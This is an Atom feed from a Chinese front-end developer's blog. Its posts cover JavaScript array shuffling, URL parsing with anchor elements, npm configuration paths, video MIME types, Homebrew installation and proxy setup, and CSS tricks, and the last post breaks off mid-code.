<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>远方</title>
  
  <subtitle>Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://luckyp.top/"/>
  <updated>2021-01-03T10:22:31.000Z</updated>
  <id>https://luckyp.top/</id>
  
  <author>
    <name>luckyp</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>随机数组</title>
    <link href="https://luckyp.top/%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%84/"/>
    <id>https://luckyp.top/随机数组/</id>
    <published>2021-01-03T10:22:31.000Z</published>
    <updated>2021-01-03T10:22:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>随机化Javascript数组（随机播放）。</p><a id="more"></a><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一种</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.shuffle = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="keyword">this</span>.length, j, temp;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">0</span> ) <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">while</span> ( --i ) &#123;</span><br><span class="line">     j = <span class="built_in">Math</span>.floor( <span class="built_in">Math</span>.random() * ( i + <span class="number">1</span> ) );</span><br><span class="line">     temp = <span class="keyword">this</span>[i];</span><br><span class="line">     <span class="keyword">this</span>[i] = <span class="keyword">this</span>[j];</span><br><span class="line">     <span class="keyword">this</span>[j] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优化</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffleArray</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = array.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">var</span> j = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (i + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">var</span> temp = array[i];</span><br><span class="line">        array[i] = array[j];</span><br><span class="line">        array[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩上一版</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffleArray</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> c = d.length - <span class="number">1</span>; c &gt; <span class="number">0</span>; c--) &#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (c + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">var</span> a = d[c];</span><br><span class="line">    d[c] = d[b];</span><br><span class="line">    d[b] = a;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffleArray</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = array.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">const</span> j = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (i + <span class="number">1</span>));</span><br><span class="line">        [array[i], array[j]] = [array[j], array[i]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 underscore.js 库</span></span><br><span class="line"><span class="keyword">var</span> _ = <span class="built_in">require</span>(<span class="string">"underscore"</span>);</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"><span class="keyword">var</span> testShuffle = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> indexOne = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> stObj = &#123;</span><br><span class="line">      <span class="string">'0'</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="string">'1'</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="string">'2'</span>: <span class="number">2</span>,</span><br><span class="line">      <span class="string">'3'</span>: <span class="number">3</span>,</span><br><span class="line">      <span class="string">'4'</span>: <span class="number">4</span>,</span><br><span class="line">      <span class="string">'5'</span>: <span class="number">5</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">      arr = _.shuffle(arr);</span><br><span class="line">      indexOne = _.indexOf(arr, <span class="number">1</span>);</span><br><span class="line">      stObj[indexOne] ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(stObj);</span><br><span class="line">&#125;;</span><br><span class="line">testShuffle();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;随机化Javascript数组（随机播放）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="js" scheme="https://luckyp.top/tags/js/"/>
    
      <category term="Array" scheme="https://luckyp.top/tags/Array/"/>
    
  </entry>
  
  <entry>
    <title>巧用a标签解析url</title>
    <link href="https://luckyp.top/%E5%B7%A7%E7%94%A8a%E6%A0%87%E7%AD%BE%E8%A7%A3%E6%9E%90url/"/>
    <id>https://luckyp.top/巧用a标签解析url/</id>
    <published>2020-11-03T15:43:27.000Z</published>
    <updated>2020-11-03T15:43:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>重构旧有项目，遇到的比较有意思的点，对于<code>url</code>的解析，并不单单可以通过字符串分割和正则的方式，通过<code>a</code>标签，可以更快捷的做到某些点。</p><a id="more"></a><p>假设现在要解析的网址 <code>url=&quot;https://luckyp.top/alinkurl/?id=1#name=haha&quot;</code>;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> alink = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>); <span class="comment">// 创建一个a标签</span></span><br><span class="line"></span><br><span class="line">alink.href = url; <span class="comment">// 将url设置为a标签的href属性，</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(alink.protocol); <span class="comment">// 取协议 ===》https:</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(alink.hostname); <span class="comment">// 取服务器主机===》luckyp.top</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(alinkpathname); <span class="comment">// 取查询路径===》/alinkurl</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(alink.search); <span class="comment">// 取查询参数===》?id=1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(alink.hash); <span class="comment">// 取#===》#name=haha</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;重构旧有项目，遇到的比较有意思的点，对于&lt;code&gt;url&lt;/code&gt;的解析，并不单单可以通过字符串分割和正则的方式，通过&lt;code&gt;a&lt;/code&gt;标签，可以更快捷的做到某些点。&lt;/p&gt;
    
    </summary>
    
    
      <category term="url" scheme="https://luckyp.top/tags/url/"/>
    
  </entry>
  
  <entry>
    <title>.npmrc相关</title>
    <link href="https://luckyp.top/npmrc%E7%9B%B8%E5%85%B3/"/>
    <id>https://luckyp.top/npmrc相关/</id>
    <published>2020-09-27T14:30:18.000Z</published>
    <updated>2020-09-27T14:30:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>npm</code>作为node开发过程中的必备工具，长期使用之后，您可能会想：这些全局安装的node包都放在硬盘里面的哪个地方？配置文件<code>.npmrc</code>文件在哪里？<code>node</code>包的缓存位置在哪里？本文里就讲述<code>npm</code>相关的这些位置信息。</p><a id="more"></a><h2 id="如何快捷修改-npmrc配置文件"><a href="#如何快捷修改-npmrc配置文件" class="headerlink" title="如何快捷修改.npmrc配置文件"></a>如何快捷修改.npmrc配置文件</h2><p><code>.npmrc</code>文件，就是<code>npm</code>的配置文件所在位置。当然，寻找这个文件的目的，多数是为了修改<code>.npmrc</code>文件内容。但npm提供了方便快捷的修改方式，不知道这个文件的位置，其实也是可以修改的。命令行是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config edit</span><br></pre></td></tr></table></figure><h2 id="npmrc配置文件在哪里"><a href="#npmrc配置文件在哪里" class="headerlink" title=".npmrc配置文件在哪里"></a>.npmrc配置文件在哪里</h2><p>如果你还是想知道<code>.npmrc</code>文件的位置，可以通过下面的命令查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config ls -l</span><br></pre></td></tr></table></figure><p>关于<code>npm</code>的缓存目录，存在感比较低。不过还是可以通过下面的方式，找到对应的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get cache</span><br></pre></td></tr></table></figure><h2 id="npm的全局node包在哪里"><a href="#npm的全局node包在哪里" class="headerlink" title="npm的全局node包在哪里"></a>npm的全局node包在哪里</h2><p>就是那些通过<code>npm install xxx -g</code>或者<code>cnpm install xxx -g</code>或者<code>yarn global add xxx</code>安装的xxx文件，到底安装在什么地方？这个其实也挺好找的。默认情况下，可以通过下面的命令查看其基础路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get prefix</span><br></pre></td></tr></table></figure><p>默认情况下，</p><ul><li>win系统的路径基础部分是：%APPDATA%/npm/</li><li>mac系统下路径基础部分是：/usr/local/</li></ul><p>默认的全局安装包位置：</p><ul><li>win系统下路径是：%APPDATA%/npm/node_modules/</li><li>mac系统下路径是：/usr/local/lib/node_modules/</li></ul><p><strong>当然对于全局包路径的查看，还可以使用下面的命令: <code>npm root -g</code></strong></p><p>转载 <a href="https://www.jianshu.com/p/e953bd426368" target="_blank" rel="noopener">https://www.jianshu.com/p/e953bd426368</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;npm&lt;/code&gt;作为node开发过程中的必备工具，长期使用之后，您可能会想：这些全局安装的node包都放在硬盘里面的哪个地方？配置文件&lt;code&gt;.npmrc&lt;/code&gt;文件在哪里？&lt;code&gt;node&lt;/code&gt;包的缓存位置在哪里？本文里就讲述&lt;code&gt;npm&lt;/code&gt;相关的这些位置信息。&lt;/p&gt;
    
    </summary>
    
    
      <category term="node" scheme="https://luckyp.top/tags/node/"/>
    
      <category term="npm" scheme="https://luckyp.top/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>常用的视频格式mime</title>
    <link href="https://luckyp.top/%E5%B8%B8%E7%94%A8%E7%9A%84%E8%A7%86%E9%A2%91%E6%A0%BC%E5%BC%8Fmime/"/>
    <id>https://luckyp.top/常用的视频格式mime/</id>
    <published>2020-08-20T15:38:24.000Z</published>
    <updated>2020-08-20T15:38:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>新的需求，产生新的项目，新的项目产生新的问题。对于video视频类型格式的<code>mimeType</code>设置，仅此备忘。</p><a id="more"></a><ul><li>flv格式是加入关联扩展名：.flv，内容类型：application/octet-stream</li><li>f4v格式是扩展名：.f4v，内容类型：application/octet-stream</li><li>mp4格式是扩展名：.mp4，内容类型：video/mp4</li><li>ogv格式是扩展名：.ogv ，内容类型：video/ogg</li><li>webm格式是扩展名：.webm，内容类型：video/webm</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;新的需求，产生新的项目，新的项目产生新的问题。对于video视频类型格式的&lt;code&gt;mimeType&lt;/code&gt;设置，仅此备忘。&lt;/p&gt;
    
    </summary>
    
    
      <category term="video" scheme="https://luckyp.top/tags/video/"/>
    
      <category term="mime" scheme="https://luckyp.top/tags/mime/"/>
    
  </entry>
  
  <entry>
    <title>Homebrew简要</title>
    <link href="https://luckyp.top/Homebrew%E7%AE%80%E8%A6%81/"/>
    <id>https://luckyp.top/Homebrew简要/</id>
    <published>2020-06-21T12:34:41.000Z</published>
    <updated>2020-06-21T12:34:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>在 Unix 大家族里，每个家族成员都有一项让人引以为豪的技能，那就是 包管理，macOS 也不例外。如果说 Mac App Store 是一家大超市，Homebrew 就是一间精品小铺——如它名字（家酿啤酒）所代表的那样。在使用 Mac 的过程当中，会接触各种 dmg 格式的安装文件，用它们装上的应用往往不知藏身何处；也可能看到一些其他人正在使用命令行工具，往往却不知道如何下载和配置。有了 Homebrew，就能轻松安装、管理、卸载许多应用，一条指令可能就足够了。<br><a id="more"></a></p><h2 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h2><p>更好管理”看不见”的应用，我们可以在 Terminal 使用命令行来轻松安装所需要的包，例如 node：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install node</span><br></pre></td></tr></table></figure><p>命令执行完毕之后，node 被安装到了 <code>/usr/local/Cellar</code> 目录中。 通过 <code>Homebrew</code> 安装的所有包都会被放在这里。 这样做有几个好处，一个是方便集中管理，删除不再使用的软件包，省去了大量软件包散落在各处带来日后清理的头疼问题。另外可以方便更集中的权限管理。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)&quot;</span><br></pre></td></tr></table></figure><h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><h3 id="安装卸载"><a href="#安装卸载" class="headerlink" title="安装卸载"></a>安装卸载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">brew --version 或者 brew -v 显示brew版本信息</span><br><span class="line">brew install &lt;formula&gt; 安装指定软件</span><br><span class="line">brew unistall &lt;formula 卸载指定软件</span><br><span class="line">brew list  显示所有的已安装的软件</span><br><span class="line">brew search text 搜索本地远程仓库的软件，已安装会显示绿色的勾</span><br><span class="line">brew search /text/ 使用正则表达式搜软件</span><br></pre></td></tr></table></figure><h3 id="升级软件"><a href="#升级软件" class="headerlink" title="升级软件"></a>升级软件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">brew update 自动升级homebrew（从github下载最新版本）</span><br><span class="line">brew outdated 检测已经过时的软件</span><br><span class="line">brew upgrade  升级所有已过时的软件，即列出的以过时软件</span><br><span class="line">brew upgrade &lt;formula&gt;升级指定的软件</span><br><span class="line">brew pin &lt;formula&gt; 禁止指定软件升级</span><br><span class="line">brew unpin &lt;formula&gt; 解锁禁止升级</span><br><span class="line">brew upgrade --all 升级所有的软件包，包括未清理干净的旧版本的包</span><br></pre></td></tr></table></figure><h3 id="清理相关"><a href="#清理相关" class="headerlink" title="清理相关"></a>清理相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">brew cleanup -n 列出需要清理的内容</span><br><span class="line">brew cleanup &lt;formula&gt; 清理指定的软件过时包</span><br><span class="line">brew cleanup 清理所有的过时软件</span><br><span class="line">brew unistall &lt;formula&gt; 卸载指定软件</span><br><span class="line">brew unistall &lt;fromula&gt; --force 彻底卸载指定软件，包括旧版本</span><br></pre></td></tr></table></figure><h2 id="管理”看得见”的应用"><a href="#管理”看得见”的应用" class="headerlink" title="管理”看得见”的应用"></a>管理”看得见”的应用</h2><p>Homebrew Cask 是 Homebrew 的扩展，借助它可以方便地在 macOS 上安装 图形界面程序，即我们常用的各类应用。Homebrew 中文含义为自制、自酿酒，Cask 中文含义为桶、木桶，桶装酒是一种成品，也就是说每一个 homebrew cask 都可以直接使用的，比如著名浏览器 Chrome 的 Cask 名称为 google-chrome，那么就可以使用如下命令安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask install google-chrome</span><br></pre></td></tr></table></figure><h2 id="自动管理依赖关系"><a href="#自动管理依赖关系" class="headerlink" title="自动管理依赖关系"></a>自动管理依赖关系</h2><p>如果没有包管理工具，我们就需要找到每个组件的下载位置，还要手动管理它们的更新，依赖关系等等，这些事情就需要消耗掉不少的精力。 好在包管理工具已经为我们处理好了这一切，我们要做的只是安装和使用。例如，要下载一个依赖于另一个软件的应用，比如说<code>you-get</code>（一款下载互联网视频的自由软件）需要先安装<code>Python 3</code>。<code>Homebrew</code>会要么提醒你电脑缺少所依赖的<code>Python 3</code>，要么恰如其分地把依赖的软件不多不少地安装好，再继续中断的<code>You-Get</code>安装过程（通常情况下会采取后者）。整个过程不但安全可靠，而且简洁优雅，所有软件都来源于其对应的官方网站，并能够安全干净地卸载，而这一切都是普通的安装方式所做不到或做不好的。</p><h2 id="终端代理问题"><a href="#终端代理问题" class="headerlink" title="终端代理问题"></a>终端代理问题</h2><p>由于境内网络环境的复杂性，有不少情况下我们可能无法正常地更新 brew 和其管理下的应用。而我们日常电脑上使用的一些代理软件，通常没办法自动对终端进行代理，所以需要手动进行一些相应的设置，以方便日后的使用。</p><p>之前用的是 <code>proxychains-ng</code> 的一款命令行应用。由于 <code>macOS</code> 升级后的 <code>SIP</code> 限制，在 <code>proxychains.conf</code> 文件中设置 <code>ss</code> 的 <code>socks5</code> 代理，无效了。解决办法是在重启后，在 <code>Recovery mode</code> 下关闭 <code>SIP</code>，但是这种方法现在已经不太推荐了。这里采用的是把代理服务器地址写入 <code>shell</code> 配置文件 <code>.bashrc</code> 或者 <code>.zshrc</code> 的方法，直接在 <code>.bashrc</code> 或者 <code>.zshrc</code> 添加下面内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&quot;http://localhost:port&quot;</span><br><span class="line">export https_proxy=&quot;http://localhost:port&quot;</span><br></pre></td></tr></table></figure><p>如果使用的是<code>trojan</code>或者<code>Shadowsocks</code>类似的客户端用户，可以手动到应用的<code>高级设置</code>里边查看，如图所示则需要将配置的端口设置为 1080：如下图所示：</p><p><img src="/images/homebrew_1.png" alt="homebrew_1"></p><p>相应的代码如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&quot;socks5://127.0.0.1:1080&quot;</span><br><span class="line">export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</span><br></pre></td></tr></table></figure><p>或者直接设置 ALL_PROXY：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export ALL_PROXY=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p><code>localhost</code> 就是一个域名，域名默认指向 <code>127.0.0.1</code>，两者是一样的。然后ESC后<code>:wq</code>保存文件，接着在终端中执行 <code>source ~/.bashrc</code>，或者退出当前终端再起一个终端。 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了。或者通过设置<code>alias</code>简写来简化操作，每次要用的时候输入 <code>setproxy</code>，不用了就 <code>unsetproxy</code></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>关于替换镜像源，个人不推荐使用镜像，会存在延时或抽风的时候。同时改变完成后可能还需要还原，如果一定要使用，推荐USTC（中科大镜像）。</p><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 替换 Homebrew</span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br><span class="line"></span><br><span class="line"># 替换 Homebrew Core</span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br><span class="line"></span><br><span class="line"># 替换 Homebrew Cask</span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br><span class="line"></span><br><span class="line"># 替换 Homebrew-bottles</span><br><span class="line"># 对于 bash 用户：</span><br><span class="line">echo &apos;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&apos; &gt;&gt; ~/.bash_profile</span><br><span class="line">source ~/.bash_profile</span><br><span class="line"># 对于 zsh 用户：</span><br><span class="line">echo &apos;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&apos; &gt;&gt; ~/.zshrc</span><br><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><h3 id="重置"><a href="#重置" class="headerlink" title="重置"></a>重置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 重置brew.git</span><br><span class="line">cd &quot;$(brew --repo)&quot;</span><br><span class="line">git remote set-url origin https://github.com/Homebrew/brew.git</span><br><span class="line"></span><br><span class="line"># 重置Homebrew-core.git</span><br><span class="line">cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot;</span><br><span class="line">git remote set-url origin https://github.com/Homebrew/homebrew-core.git</span><br><span class="line"></span><br><span class="line"># 替换Homebrew Cask</span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://github.com/Homebrew/homebrew-cask.git</span><br><span class="line"></span><br><span class="line"># 注释掉bash/zsh配置文件里的有关Homebrew Bottles</span><br></pre></td></tr></table></figure><p>参考链接<br><a href="https://www.zhihu.com/question/31360766/answer/673451632" target="_blank" rel="noopener">https://www.zhihu.com/question/31360766/answer/673451632</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 Unix 大家族里，每个家族成员都有一项让人引以为豪的技能，那就是 包管理，macOS 也不例外。如果说 Mac App Store 是一家大超市，Homebrew 就是一间精品小铺——如它名字（家酿啤酒）所代表的那样。在使用 Mac 的过程当中，会接触各种 dmg 格式的安装文件，用它们装上的应用往往不知藏身何处；也可能看到一些其他人正在使用命令行工具，往往却不知道如何下载和配置。有了 Homebrew，就能轻松安装、管理、卸载许多应用，一条指令可能就足够了。&lt;br&gt;
    
    </summary>
    
    
      <category term="Homebrew" scheme="https://luckyp.top/tags/Homebrew/"/>
    
      <category term="镜像" scheme="https://luckyp.top/tags/%E9%95%9C%E5%83%8F/"/>
    
      <category term="代理" scheme="https://luckyp.top/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>好用的css技巧</title>
    <link href="https://luckyp.top/%E5%A5%BD%E7%94%A8%E7%9A%84css%E6%8A%80%E5%B7%A7/"/>
    <id>https://luckyp.top/好用的css技巧/</id>
    <published>2020-06-07T10:18:15.000Z</published>
    <updated>2020-06-07T10:18:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>汇总开发中可使用的好用又简单的css技巧。<br><a id="more"></a></p><h2 id="active伪类与CSS数据上报"><a href="#active伪类与CSS数据上报" class="headerlink" title=":active伪类与CSS数据上报"></a>:active伪类与CSS数据上报</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.button-1</span><span class="selector-pseudo">:active</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="built_in">url</span>(./pixel.gif?action=click&amp;id=button1);</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.button-2</span><span class="selector-pseudo">:active</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="built_in">url</span>(./pixel.gif?action=click&amp;id=button2);</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想要知道两个按钮的点击率，CSS就可以实现，无需通过JavaScript开发,当点击按钮的时候，相关行为数据就会上报给服务器，这种上报就算把JavaScript禁用掉也无法阻止，方便快捷，特别适合A/B测试</p><h2 id="empty-伪类"><a href="#empty-伪类" class="headerlink" title=":empty 伪类"></a>:empty 伪类</h2><p>div元素为空就会匹配:empty伪类，呈现出虚线框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cs-empty"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.cs-empty</span><span class="selector-pseudo">:empty</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">120px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">10px</span> dashed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/css_empty1.png" alt="虚线框"></p><h3 id="隐藏空元素"><a href="#隐藏空元素" class="headerlink" title="隐藏空元素"></a>隐藏空元素</h3><p>在动态列表之类，如果没有加载出来前，会因为margin之类的存在大量空白，可通过该方式隐藏</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.cs-module</span><span class="selector-pseudo">:empty</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字段缺失智能提示"><a href="#字段缺失智能提示" class="headerlink" title="字段缺失智能提示"></a>字段缺失智能提示</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span 